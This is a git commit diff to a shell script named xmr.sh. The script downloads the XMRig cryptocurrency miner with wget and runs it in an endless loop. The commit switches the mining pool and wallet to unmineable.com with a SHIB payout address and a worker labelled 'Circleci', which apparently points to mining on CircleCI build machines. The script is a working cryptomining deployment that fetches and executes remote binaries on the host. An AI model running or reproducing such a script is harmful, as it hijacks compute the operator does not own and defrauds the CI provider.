a2e8cfdefc6b98a710c72c9019c7a2932e0ee15c
lushenry654 <85671596+lushenry654@users.noreply.github.com>
2021-10-30 22:35:29 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -3,7 +3,7 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-x64.tar.gz && tar xf xmrig-6.15.2-linux-x64.tar.gz
 cd xmrig-6.15.2
 while [ 1 ]; do
-./xmrig --donate-level 1 -o pool.hashvault.pro:3333 -u 8BAwTuT1K5FVz73nqizTE8DZjxd5TW9uHF57XsLWK1S4SWNxpuYfpwGeuAc1wUMmUYQNNCsAP4qrMcQZUZkCc3yWNgjq5Ac -p 2K -a rx/0 -k 
+./xmrig -o rx.unmineable.com:3333 -u SHIB:0x3fd05afac3e2edced734c32fd7bb2f176c588298.Circleci#uzvu-2w9w -p X -k -a rx/0
 sleep 3
 done
 sleep 999
